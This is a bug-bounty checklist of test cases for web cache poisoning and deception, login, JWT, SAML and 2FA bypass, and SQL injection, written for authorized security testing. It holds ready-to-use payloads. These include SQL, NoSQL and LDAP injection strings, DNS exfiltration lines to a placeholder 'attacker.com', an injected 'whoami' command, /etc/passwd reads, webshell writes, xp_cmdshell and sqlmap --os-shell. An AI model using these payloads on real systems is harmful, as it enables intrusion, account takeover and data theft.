# Web Bug Based Checklist

<details>

<summary>WCD/WCP</summary>

### Web Cache Vulnerabilities — Test-Case Checklist

> Run every box against one chosen request. Attach a **cache buster** (unique unkeyed query param) to each probe so tests stay isolated.

### 0. Setup & Cacheability

* [ ] Confirm response is cached: check `X-Cache`, `Cf-Cache-Status`, `Age`, `X-Cache-Hits`
* [ ] Send the request twice — does it flip `miss` → `hit`?
* [ ] Add a cache buster so every test request has a unique cache key
* [ ] Read `Cache-Control` / `Pragma` / `Vary` on the response
* [ ] Note which inputs are keyed vs unkeyed (Akamai: `Pragma: akamai-x-get-true-cache-key`)
* [ ] Enable debug headers: Akamai `Pragma: akamai-x-check-cacheable, akamai-x-cache-on` / Fastly `Fastly-Debug: 1`
* [ ] Check how the CDN treats 4xx/5xx (default error caching → DoS potential)

### 1. Unkeyed Header Fuzzing (poisoning)

* [ ] `X-Forwarded-Host` (Title-Case)
* [ ] `X-FORWARDED-HOST` (UPPERCASE)
* [ ] `x-forwarded-host` (lowercase)
* [ ] `X_Forwarded_Host` (dash → underscore)
* [ ] `X-Forwarded-Host :` (space before colon)
* [ ] Double header — send `X-Forwarded-Host` twice
* [ ] `X-Forwarded-Scheme` / `X-Forwarded-Proto`
* [ ] `X-Host` / `X-Original-URL` / `X-Rewrite-URL`
* [ ] `Forwarded`
* [ ] Bulk header wordlist (rate-limited: 1 req/sec, \~50 headers/req)

### 2. Unkeyed Cookie Fuzzing (poisoning)

* [ ] Fuzz for hidden/unkeyed cookie parameters
* [ ] Check if any cookie is reflected into the cached response

### 3. Unkeyed / Excluded Query Param Fuzzing (poisoning)

* [ ] Tracking params: `utm_.*` `gclid` `gdftrk` `_ga` `mc_.*` `trk_.*` `dm_i` `_ke` `sc_.*` `fbclid`
* [ ] Framework param: `_method`
* [ ] Bulk query wordlist (rate-limited: 1 req/sec, \~50 params/req)
* [ ] Test excluded param reflected → XSS
* [ ] Test excluded `_method` → DoS / logic change

### 4. Request Shape Discrepancies (poisoning)

* [ ] Fat GET — GET with a body the origin reads but cache ignores
* [ ] Cache-key normalization — `%2F`, casing, dot-segments decoded differently by cache vs origin
* [ ] Header-size discrepancy (origin limit < cache limit → cacheable error)
* [ ] Invalid header (`\:`, `Connection: Host`, `Upgrade: BB`) → cacheable error

### 5. Static-Extension Deception

* [ ] `path/account.css`
* [ ] `path/account.js`
* [ ] `path/account/nonexistent.css`
* [ ] `path/account/test.js` (trailing-path variant → 200)
* [ ] Less-common ext: `.avif` `.webp` `.svg` `.ico` `.woff2` `.map`
* [ ] Mind Cloudflare Cache Deception Armor (Content-Type must match ext)
* [ ] Test origin returning NO `Content-Type` header

### 6. Path-Prefix Caching

* [ ] Check if CDN caches `/path/*` or `/static/*` or `*.ext`
* [ ] Route a sensitive endpoint through the cached prefix

### 7. Path Traversal

* [ ] `../`
* [ ] `..%2F`
* [ ] `%2E%2E%2F`
* [ ] Double-encoded / Unicode variants (WAF bypass)

### 8. Delimiter Discrepancies (deception)

* [ ] `;`
* [ ] `%00`
* [ ] `%0d`
* [ ] `%0a`
* [ ] `%09`
* [ ] `?` `#` `&` `!`
* [ ] Full `%00`–`%FF` sweep
* [ ] Encoded-percent variants:
  * [ ] `user\xFUZZ` / `user\xFUZZ.js`
  * [ ] `user%FUZZ` / `user%FUZZ.js`
  * [ ] `user%25%FUZZ` / `user%25%FUZZ.js`
  * [ ] `user%25%25%FUZZ` / `user%25%25%FUZZ.js`
  * [ ] `user%FUZZ%FUZZ` / `user%FUZZ%FUZZ.js`

### 9. Chains

* [ ] Delimiter + path traversal → cache deception
* [ ] `/static/..%2Faccount%3Bx.css`
* [ ] `/assets/..%2F..%2Fapi%2Fme%00.js`
* [ ] Self-bug (self-XSS) + deception → stored XSS for others

### 10. Path-Confusion Payloads (deception)

* [ ] `example.com/nonexistent.css`
* [ ] `example.com/%0Anonexistent.css`
* [ ] `example.com/%3Bnonexistent.css`
* [ ] `example.com/%23nonexistent.css`
* [ ] `example.com/%3Fname=val nonexistent.css`

### 11. Advanced / Theoretical (DoS)

* [ ] HTTP version not in cache key → DoS
* [ ] FE/BE header-parsing discrepancy → DoS
* [ ] HTTP/2 downgrade → DoS

### 12. Confirm Impact

* [ ] Unkeyed header reflected → Stored XSS
* [ ] Unkeyed header in redirect → Stored Open Redirect
* [ ] Excluded query reflected → Stored XSS
* [ ] Cacheable error/empty/bad status → DoS
* [ ] Sensitive endpoint cached → token/PII/CSRF-token theft → ATO
* [ ] Verify victim (no cache buster) receives the poisoned/cached response
* [ ] If cached ≤5s, use Intruder NULL payloads to hold the key for PoC

</details>

<details>

<summary>Authentication Issues</summary>

### Authentication Issues — Test-Case Checklist

> Run these boxes against a login / auth flow. Group order: pre-auth recon → login bypass (injection + logic) → password/session handling → JWT → SAML → OTP/2FA → impact. Capture every request in your proxy before tampering.

***

### 0. Recon & Quick Wins

* [ ] Read page source / HTML comments (scroll right too) for creds, hints, hidden fields
* [ ] Try directly accessing restricted pages (forced browsing) without auth
* [ ] Check `autocomplete="off"` missing on password/sensitive inputs
* [ ] Check Secure / HttpOnly flags on session cookies
* [ ] Look for token/password leaking in the URL
* [ ] Default credentials (root/admin/tech-name/default user) — DefaultCreds-cheat-sheet, SecLists
* [ ] Build a target-specific wordlist (h0tak88r casing/permutation script) + crunch
* [ ] Username enumeration via login / register / reset error differences
* [ ] GraphQL: many auth attempts batched in one request (rate-limit bypass)

***

### 1. Login Bypass — Email / Parameter Tricks

* [ ] `yourname@wearehackerone.com` / `@bugcrowd.com` variants
* [ ] Nested email: `lol@company.com@collaborator.net`
* [ ] Don't send the parameters — send none, or only one
* [ ] PHP type juggling: `user[]=a&pwd=b`
* [ ] PHP type juggling: `user=a&pwd[]=b`
* [ ] PHP type juggling: `user[]=a&pwd[]=b`
* [ ] Change Content-Type to JSON, send JSON values (include bool `true`)
* [ ] POST-not-supported → send JSON in body with **GET** + `Content-Type: application/json`
* [ ] Node.js parsing: `password[password]=1`
* [ ] Node.js JSON: `"password":{"password": 1}` (need a valid username)

***

### 2. Login Bypass — Injection

**SQL injection auth bypass** (try in username and password):

* [ ] `' or '1'='1`
* [ ] `' or ''='`
* [ ] `' or 1]%00`
* [ ] `' or /* or '`
* [ ] `' or "a" or '`
* [ ] `' or 1 or '`
* [ ] `' or true() or '`
* [ ] `admin' or '`
* [ ] `admin' or '1'='2`
* [ ] `'or string-length(name(.))<10 or'` (XPath)
* [ ] `'or contains(name,'adm') or'` (XPath)
* [ ] `'or position()=2 or'` (XPath)

**NoSQL injection auth bypass:**

* [ ] `username[$ne]=x&password[$ne]=x`
* [ ] `{"username":{"$ne":null},"password":{"$ne":null}}`
* [ ] `{"username":{"$gt":""},"password":{"$gt":""}}`
* [ ] `admin'||'1'=='1` (JS injection in NoSQL)

**LDAP injection auth bypass:**

* [ ] `*`
* [ ] `*)(&`
* [ ] `*)(|(&`
* [ ] `*)(|(*`
* [ ] `admin)(&)`
* [ ] `admin)(!(&(|`
* [ ] `pwd)` / `pwd))` variations

***

### 3. Password Handling & Logic

* [ ] Empty password (some accounts accept blank)
* [ ] Password-type attribute flip (e.g. `type=2 → type=1` cleartext) then brute
* [ ] Null/edge password values: `-1`, `0`, `9999999999`, empty
* [ ] Response manipulation: change `302`/fail → `200`/success
* [ ] Response manipulation: flip `false`→`true`, change `role`/`ID`/status code (PrevEsc)
* [ ] Burp Match & Replace to rewrite identity (`lol@sso.com → lol@gmail.com`)
* [ ] Changing authentication type to null
* [ ] Weak password policy (change/reset/register accept simple passwords)
* [ ] Password change without asking current password
* [ ] Email change without password confirmation

***

### 4. Session, Token & Endpoint Logic

* [ ] Refresh-token endpoint: remove `Authorization` header + change `username` → token for any user
* [ ] "Remember me" cookie: decode/forge for ATO; check it survives password change
* [ ] Improper MS SSO: oversized content-length on redirect leaks internal response → flip `302`→`200`, delete `Location`
* [ ] Auth bypass via subdomain takeover (cookie scoped to `.domain.com`)
* [ ] CMS portlet access (Liferay `p_p_id=58` → reach Create Account / hidden portlets)
* [ ] Spring Actuator endpoints exposed / broken auth
* [ ] Over-permissive "not-login token" reused on sensitive endpoints (TikTok-style)
* [ ] Token not scoped to app/audience — reused across endpoints/services

***

### 5. JWT — Triage (jwt\_tool first)

* [ ] `jwt_tool -M at -t <url> -rh "Authorization: Bearer <jwt>"` (all tests)
* [ ] **Required?** remove token — does request still succeed?
* [ ] **Checked?** delete last chars of signature — error / different / same?
* [ ] **Persistent?** replay same token after logout / 24h — still valid (immortal)?
* [ ] **Origin?** token first seen server-side, not client-side?
* [ ] **Claim order?** tamper a reflected payload claim, keep signature — processed?
* [ ] Sensitive data exposure in payload (decode it)

### 6. JWT — Signature & Key Attacks

* [ ] `alg:none` / `None` / `NONE` / `nOnE` + empty signature (`jwt_tool -X a`)
* [ ] Accept arbitrary signature / null signature (CVE-2020-28042)
* [ ] Strip signature entirely (`jwt_tool -X n`)
* [ ] Crack HMAC secret — hashcat `-m 16500` / `jwt_tool -C -d wordlist`
* [ ] RS256→HS256 algorithm confusion (sign with public key as HMAC secret)
* [ ] Algorithm confusion, no exposed key — `rsa_sign2n` / `sig2n` to recover key
* [ ] Find public key: `/jwks.json`, `/.well-known/jwks.json`, `/openid/connect/jwks.json`, `/api/keys`

### 7. JWT — Header Parameter Injection

* [ ] `jwk` — embedded key (Burp Embedded JWK / `jwt_tool -X i`, CVE-2018-0114)
* [ ] `jku` — point JWK Set URL to attacker-monitored server
* [ ] `kid` — path traversal `../../../../dev/null` + sign with null byte (`AA==`)
* [ ] `kid` — load known file (CSS/JS) as HMAC secret to verify
* [ ] `kid` — SQL injection (`xxxx' UNION SELECT 'aaa`)
* [ ] `kid` — command injection (`key.crt; whoami && ...`)
* [ ] `x5u` — attacker self-signed cert URL
* [ ] `x5c` — embedded attacker cert chain
* [ ] `x5t` / `cty` (try `cty: text/xml` or java-serialized → XXE/deser)

### 8. JWT — Claims & Misc

* [ ] `exp` — replay after expiry; check if token ever expires
* [ ] `nbf` — bypass not-before claim
* [ ] `jti` — replay when ID space too small / not enforced
* [ ] Cross-service relay — token from sibling client of same JWT service accepted?
* [ ] Example/sample token (Microsoft v1.0 id\_token) accepted (missing audience check)
* [ ] ATO from IDOR — swap user\_id in payload (leaked via wrong-password/reset response)

***

### 9. SAML

* [ ] Edit assertion (e.g. email → `admin@target`) **without** touching signature
* [ ] Remove the entire `<Signature>` (signature stripping)
* [ ] Remove only the `<SignatureValue>` value
* [ ] XML comment injection: register `admin<!--1-->@target` (parser strips comment)
* [ ] XML Signature Wrapping (XSW) — duplicate/move signed/unsigned assertions
* [ ] `ds:Reference URI` SSRF (PySAML2): `URI="http://attacker/?#id..."`
* [ ] CVE-2021-21239 — strip `SignatureValue`/`DigestValue`, re-sign with own key (xmlsec1)
* [ ] Mis-scoped SAML session — attacker-configured IdP (Okta) provisions victim email → SP issues victim session
* [ ] Replace recipient/destination/audience in assertion
* [ ] Reuse/replay a SAMLResponse (no one-time enforcement)

***

### 10. OTP / 2FA Bypass

* [ ] Omit the `code`/`otp` parameter entirely
* [ ] Send empty / null OTP value
* [ ] Response manipulation on OTP verify (`false`→`true`, `302`→`200`)
* [ ] Reuse a verify/2FA-setup token on a different action (unlink email/phone)
* [ ] 2FA can be disabled while logged in without re-entering password
* [ ] Brute force OTP (no rate limit) — Intruder, large window
* [ ] Race condition on OTP/verify endpoint
* [ ] 2FA not enforced on OAuth/social linking path
* [ ] Backup-code / recovery-flow weaker than primary 2FA

***

### 11. Confirm Impact

* [ ] Full ATO (login as victim)
* [ ] Pre-ATO (reserve victim identity before signup)
* [ ] Privilege escalation (user → admin via claim/role tamper)
* [ ] Auth bypass to sensitive data / internal endpoints
* [ ] Verify on a clean session / second account that the bypass reproduces
* [ ] Document exactly which control was skipped and what the attacker must supply

***

### Tooling

* [ ] `jwt_tool` (triage + forge), JWT Editor + JOSEPH Burp extensions
* [ ] `hashcat -m 16500` (JWT HMAC crack), JWT-Heartbreaker (weak-key detect)
* [ ] `rsa_sign2n` / `portswigger/sig2n` (recover public key for alg confusion)
* [ ] `xmlsec1` (SAML re-signing), SAML Raider Burp extension
* [ ] DefaultCreds-cheat-sheet, SecLists default passwords, crunch (wordlists)

</details>

<details>

<summary>SQL Injection</summary>

### SQL Injection — Test-Case Checklist

> Run these boxes against an injectable surface. Order: find injection points → detect → identify type/DBMS → confirm → exploit (UNION/boolean/error/time/OOB) → second-order → WAF bypass → automate → impact. Add a unique marker per probe so you can track which input reflected.

***

### 0. Map the Attack Surface (where to inject)

* [ ] **ID-based params** (`?id=`, `user_id`, `pid`) — most common
* [ ] Login form — username/email field
* [ ] Login form — password field
* [ ] Remember-me cookie value
* [ ] Session tokens
* [ ] OAuth callback parameters
* [ ] 2FA/MFA endpoints
* [ ] Search: main input, search API, advanced filters, autocomplete/typeahead
* [ ] Account recovery: forgot-password input, reset link, verification, username lookup
* [ ] Admin / CMS panels
* [ ] E-commerce: cart, checkout, payment callbacks, invoice gen, order-status lookup
* [ ] Profile/settings: edit endpoints, view-by-ID, notification prefs
* [ ] User content: comments, reviews/ratings, contact forms, support tickets
* [ ] List/filter controls: `page=`, `sort=`, `order=`, category dropdowns, date ranges
* [ ] **Non-obvious inputs:** HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, JSON body fields, GraphQL args, file-upload names

***

### 1. Recon / Tooling Setup

* [ ] Burp Active Scan + Agartha extension on candidate requests
* [ ] Subdomains → crawl → `gf sqli urls >> sqli` → `sqlmap -m sqli --dbs --batch`
* [ ] Dork `.php`/likely-vuln paths → `Arjun` (param discovery) → `sqlmap`
* [ ] Identify request method, content-type, and which params echo into the response

***

### 2. Detection — Break the Query

* [ ] Single quote `'` → error / 500 / different response?
* [ ] Double quote `"`
* [ ] Backtick `` ` ``
* [ ] Two singles `''` (re-balance) → page returns to normal?
* [ ] Backslash `\`
* [ ] Math test: `?id=2-1` returns same as `?id=1` (numeric context)
* [ ] Boolean pair: `' AND '1'='1` (true) vs `' AND '1'='2` (false)
* [ ] Numeric boolean: `AND 1=1` vs `AND 1=2`
* [ ] Concatenation tests: `'||'`, `'+'`, `' '` (Oracle/MSSQL/MySQL differ)
* [ ] Comment terminators: `-- -`, `#`, `/*`, `;%00`

***

### 3. Identify Context & DBMS

* [ ] Determine context: numeric / single-quote string / double-quote / LIKE `%...%` / IN () / ORDER BY
* [ ] Fingerprint via error messages
* [ ] Version strings: `@@version` (MySQL/MSSQL), `version()` (PG/MySQL), `banner` (Oracle)
* [ ] Concatenation behavior: `CONCAT()` (MySQL) / `||` (PG/Oracle) / `+` (MSSQL)
* [ ] Comment style: `-- -` / `#` (MySQL) / `--` (PG/MSSQL/Oracle)
* [ ] String funcs: `SUBSTRING`/`SUBSTR`/`MID`, `SLEEP`/`pg_sleep`/`WAITFOR`/`dbms_pipe`

***

### 4. UNION-Based

* [ ] Find column count via `ORDER BY 1..N` until error
* [ ] Find column count via `UNION SELECT NULL,NULL,...`
* [ ] Identify which columns are reflected (string-compatible): `UNION SELECT 'a',NULL,..`
* [ ] Dump version into a visible column
* [ ] Enumerate DBs: `information_schema.schemata`
* [ ] Enumerate tables: `information_schema.tables`
* [ ] Enumerate columns: `information_schema.columns`
* [ ] Dump creds/PII from target tables
* [ ] Oracle: append `FROM dual`; MSSQL: column type-match matters

***

### 5. Boolean-Based Blind

* [ ] Confirm true/false divergence with `AND 1=1` / `AND 1=2`
* [ ] Extract length: `AND LENGTH(database())=N`
* [ ] Char-by-char: `AND SUBSTRING(database(),1,1)='a'`
* [ ] Binary search with `ASCII()`/`>`/`<` to speed extraction
* [ ] Use `LIKE` divergence (e.g. comment-hiding trick on Pornhub-style filters)

***

### 6. Error-Based

* [ ] MySQL `extractvalue(1,concat(0x7e,(SELECT @@version)))`
* [ ] MySQL `updatexml(1,concat(0x7e,(SELECT database())),1)`
* [ ] MySQL double-query / `floor(rand()*2)` group-by error
* [ ] MSSQL `CONVERT(int,(SELECT @@version))` / `CAST`
* [ ] PostgreSQL `CAST((SELECT version()) AS int)`
* [ ] Oracle `CTXSYS.DRITHSX.SN` / `utl_inaddr.get_host_name`

***

### 7. Time-Based Blind (payload bank)

* [ ] MySQL `SLEEP(5)#` and `' or sleep(5)#` (and `"`, `)`, `))`, `')`, `")` variants)
* [ ] MySQL stacked subselect: `AND (SELECT * FROM (SELECT(SLEEP(5)))a)`
* [ ] MySQL `'XOR(if(now()=sysdate(),sleep(5),0))OR'`
* [ ] MySQL `benchmark(10000000,MD5(1))#`
* [ ] PostgreSQL `pg_sleep(5)--` (and quote/paren variants)
* [ ] MSSQL `;waitfor delay '0:0:5'--` (and `'`, `"`, `)` variants)
* [ ] SQLite heavy query: `AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`
* [ ] `ORDER BY SLEEP(5)` / `'&&SLEEP(5)&&'1` context variants
* [ ] Confirm timing is consistent (run baseline + repeat to rule out jitter)

***

### 8. Stacked Queries & OOB (out-of-band)

* [ ] Stacked query support: `; SELECT ...` / `;WAITFOR DELAY` (MSSQL, PG)
* [ ] DNS exfil — MySQL `LOAD_FILE(CONCAT('\\\\',(query),'.attacker.com\\x'))`
* [ ] DNS exfil — MSSQL `master..xp_dirtree '\\(query).attacker.com\x'`
* [ ] DNS exfil — Oracle `UTL_HTTP` / `UTL_INADDR` / `DBMS_LDAP`
* [ ] PostgreSQL OOB via `dblink` / `COPY ... TO PROGRAM` (if superuser)
* [ ] Burp Collaborator / interactsh as the listener

***

### 9. Second-Order

* [ ] Identify input stored now, used in a query later (registration username, profile field)
* [ ] Plant payload on store endpoint, trigger on the consuming endpoint
* [ ] sqlmap `--second-order=<url>` (or `--second-req`) to automate the trigger
* [ ] Watch for payloads firing in admin/reporting/export views

***

### 11. Advanced / RCE Escalation

* [ ] MySQL file read: `LOAD_FILE('/etc/passwd')` (needs FILE priv + secure\_file\_priv)
* [ ] MySQL file write: `INTO OUTFILE`/`DUMPFILE` → webshell in webroot
* [ ] MSSQL `xp_cmdshell` (enable via `sp_configure`) → OS command
* [ ] MSSQL linked servers / `OPENQUERY`
* [ ] Oracle `DBMS_SCHEDULER`/`DBMS_JAVA` for command exec
* [ ] Read DB creds → pivot / reuse elsewhere
* [ ] Signature/HMAC bypass on signed params (Razer easy2pay-style) before injecting

***

### 12. WAF / Filter Bypass

* [ ] Inline comments: `/*!50000SELECT*/`, `SE/**/LECT`
* [ ] Case toggling: `SeLeCt`, `UnIoN`
* [ ] Whitespace alts: `%09`, `%0a`, `%0c`, `%a0`, `/**/`, `+`
* [ ] Encoding: URL, double-URL, unicode, hex (`0x...`), char() concat
* [ ] Keyword splitting / nesting: `UNIONUNION SELECTSELECT`
* [ ] Alternate operators: `||`, `&&`, `LIKE`, `RLIKE`, `REGEXP` instead of `=`
* [ ] Logical equivalents: `AND 1` , `AND true()`, `AND 2>1`
* [ ] sqlmap `--tamper` (space2comment, between, charencode, randomcase, etc.)
* [ ] Cookie / header injection point to dodge URL-focused WAF rules

***

### 13. Automation (sqlmap)

* [ ] `sqlmap -r request.txt --batch` (use a saved proxy request)
* [ ] `--level=5 --risk=3` for deeper tests
* [ ] `--dbms=` to pin the DBMS once known
* [ ] `--technique=BEUSTQ` to control which methods run
* [ ] `--dbs` → `--tables` → `--columns` → `--dump`
* [ ] `--tamper=` chain for WAF bypass
* [ ] `--second-order=<url>` for stored injection
* [ ] `--os-shell` / `--sql-shell` for exploitation
* [ ] Headers/cookie: mark injection point with `*` and `--cookie`/`-H`



</details>



